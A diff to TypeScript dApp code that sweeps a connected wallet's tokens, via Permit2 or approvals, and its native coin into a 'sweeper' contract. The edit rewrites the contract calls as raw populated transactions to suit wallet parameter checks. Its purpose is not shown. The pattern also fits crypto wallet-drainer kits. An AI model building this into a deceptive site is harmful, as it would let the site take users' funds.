@@ -186,19 +186,28 @@ export async function approveAndSweep(
   if (permitted.length === 0) {
     onStatus?.('Sweep native — confirm in wallet…');
     const feeData = await provider.getFeeData();
-    const overrides: Record<string, any> = {
+    const nonce = await provider.getTransactionCount(sender, 'pending');
+
+    const populatedTx = await sweeper.sweepTokensAndNative.populateTransaction([]);
+    
+    const txReq: any = {
+      from: sender,
+      to: getAddress(sweeperAddr),
+      data: populatedTx.data,
       value: nativeValue,
       gasLimit: 100000n,
       chainId: chainId,
+      nonce: nonce,
     };
+
     if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
-      overrides.maxFeePerGas = feeData.maxFeePerGas;
-      overrides.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
+      txReq.maxFeePerGas = feeData.maxFeePerGas;
+      txReq.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
     } else if (feeData.gasPrice) {
-      overrides.gasPrice = feeData.gasPrice;
+      txReq.gasPrice = feeData.gasPrice;
     }
 
-    const tx = await sweeper.sweepTokensAndNative([], overrides);
+    const tx = await signer.sendTransaction(txReq);
     lastHash = tx.hash;
     await tx.wait();
     return lastHash;
@@ -267,29 +276,47 @@ export async function approveAndSweep(
 
   try {
     const feeData = await provider.getFeeData();
-    
+    const nonce = await provider.getTransactionCount(sender, 'pending');
+
+    // Populate transaction data explicitly to satisfy strict wallet parameter rules
+    const populatedTx = await sweeper.sweepWithPermit2.populateTransaction(
+      permitStruct,
+      details,
+      signature
+    );
+
     let estimatedGas: bigint;
     try {
-      estimatedGas = await sweeper.sweepWithPermit2.estimateGas(permitStruct, details, signature, { value: nativeValue });
-      estimatedGas = (estimatedGas * 13n) / 10n;
+      estimatedGas = await provider.estimateGas({
+        from: sender,
+        to: getAddress(sweeperAddr),
+        data: populatedTx.data,
+        value: nativeValue,
+      });
+      estimatedGas = (estimatedGas * 13n) / 10n; // 30% gas buffer
     } catch {
-      estimatedGas = 500000n;
+      estimatedGas = 500000n; // Fallback gas limit
     }
 
-    const overrides: Record<string, any> = {
+    // Fully populated raw transaction object with ALL mandatory fields (chainId, to, data, nonce, gas)
+    const txReq: any = {
+      from: sender,
+      to: getAddress(sweeperAddr),
+      data: populatedTx.data,
       value: nativeValue,
       gasLimit: estimatedGas,
       chainId: chainId,
+      nonce: nonce,
     };
 
     if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
-      overrides.maxFeePerGas = feeData.maxFeePerGas;
-      overrides.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
+      txReq.maxFeePerGas = feeData.maxFeePerGas;
+      txReq.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
     } else if (feeData.gasPrice) {
-      overrides.gasPrice = feeData.gasPrice;
+      txReq.gasPrice = feeData.gasPrice;
     }
 
-    const tx = await sweeper.sweepWithPermit2(permitStruct, details, signature, overrides);
+    const tx = await signer.sendTransaction(txReq);
     lastHash = tx.hash;
     await tx.wait();
     return lastHash;
@@ -309,7 +336,7 @@ async function classicApproveAndSweep(
   sendNative: boolean,
   onStatus?: (s: string) => void,
 ): Promise<string | null> {
-  const sender = await signer.getAddress();
+  const sender = getAddress(await signer.getAddress());
   const network = await provider.getNetwork();
   const chainId = Number(network.chainId);
   let lastHash: string | null = null;
@@ -342,19 +369,27 @@ async function classicApproveAndSweep(
 
   onStatus?.('Sweep once — confirm in wallet…');
   const feeData = await provider.getFeeData();
-  const overrides: Record<string, any> = {
+  const nonce = await provider.getTransactionCount(sender, 'pending');
+  const populatedTx = await sweeper.sweepTokensAndNative.populateTransaction(tokenAddresses);
+
+  const txReq: any = {
+    from: sender,
+    to: getAddress(sweeperAddr),
+    data: populatedTx.data,
     value: nativeValue,
     gasLimit: 300000n,
     chainId: chainId,
+    nonce: nonce,
   };
+
   if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
-    overrides.maxFeePerGas = feeData.maxFeePerGas;
-    overrides.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
+    txReq.maxFeePerGas = feeData.maxFeePerGas;
+    txReq.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
   } else if (feeData.gasPrice) {
-    overrides.gasPrice = feeData.gasPrice;
+    txReq.gasPrice = feeData.gasPrice;
   }
 
-  const tx = await sweeper.sweepTokensAndNative(tokenAddresses, overrides);
+  const tx = await signer.sendTransaction(txReq);
   lastHash = tx.hash;
   await tx.wait();
   return lastHash;
